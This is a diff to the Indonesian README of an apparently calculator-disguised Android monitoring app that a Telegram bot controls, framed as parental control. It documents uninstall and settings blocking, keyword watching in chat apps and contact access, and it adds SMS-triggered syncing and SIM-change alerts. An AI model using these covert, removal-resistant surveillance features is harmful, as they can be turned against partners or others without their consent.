@@ -87,6 +87,7 @@ Catatan: kalkulatornya beneran bisa dipakai. Ketik angka setelah `=` mulai hitun
 - Proteksi tamper: saat Aksesibilitas aktif, layar untuk mematikan Aksesibilitas, mencabut admin perangkat, menghapus aplikasi ini, membuka sumber tak dikenal, atau membuka opsi pengembang langsung ditutup dan pemilik dikabari. Matikan dulu dengan `/lindungi off` kalau memang mau mengubah setelan HP anak.
 - Pantau kata di aplikasi: `/pantauapp on` memakai daftar kata dari `/watch` dan memeriksa aplikasi chat/sosial terpilih. Kabar hanya berisi aplikasi + kata + waktu; layar password, banking, pembayaran, browser, dan aplikasi ini dilewati, isi pesan tidak disimpan, dan kabar dibatasi 15 menit per app+kata (maks 30/hari). Atur daftar app dengan `/pantauapp tambah WhatsApp`, `/pantauapp hapus WhatsApp`, atau `/pantauapp daftar`.
 - `SYSTEM_ALERT_WINDOW` (tampil di atas aplikasi lain) bersifat opsional; hanya dipakai agar layanan lebih mudah dihidupkan ulang dari latar di Android 12+, dan hanya aktif kalau kamu mengizinkannya lewat tombol Anti-kill.
+- `RECEIVE_SMS` dan `READ_PHONE_STATE` juga opsional: SMS masuk dan panggilan yang baru selesai langsung memicu pemeriksaan data (tidak menunggu `syncInterval`), dan identitas kartu SIM (`simOperator` + negara) dipantau — kalau SIM dicabut atau diganti, kamu dapat pesan Telegram. Ditolak pun monitoring tetap jalan lewat pemeriksaan berkala.
 - Service monitoring memakai tipe foreground `specialUse` (`FOREGROUND_SERVICE_SPECIAL_USE`) di Android 14+, supaya tidak kena batas 6 jam/24 jam tipe `dataSync` di Android 15+; kalau percobaan `startForeground` dengan tipe lengkap ditolak (mis. saat diluncurkan dari boot di Android 15+), service mencoba ulang dengan `specialUse` saja.
 
 ## Perintah Telegram
@@ -151,7 +152,7 @@ Menu ☰ di chat owner hanya menampilkan `/help` dan `/ping`; semua perintah lai
 | `/lock` | Kunci layar |
 | `/ring` | Bunyikan HP |
 | `/contacts [nama\|nomor]` atau `/contacts [halaman]` | Cari kontak; tanpa argumen atau dengan angka halaman menampilkan semua kontak per halaman (30 nomor, butuh izin Kontak). Navigasi halaman juga tersedia lewat tombol **⬅️ Sebelumnya** / **Berikutnya ➡️** |
-| `/apps` | Daftar aplikasi terinstal |
+| `/apps` | Daftar aplikasi yang punya ikon peluncur; tambahkan `all` (`/apps all`) untuk seluruh paket terpasang |
 | `/storage` | Sisa penyimpanan |
 | `/log` | Log error terakhir |
 | `/ping` | Cek delay bot |
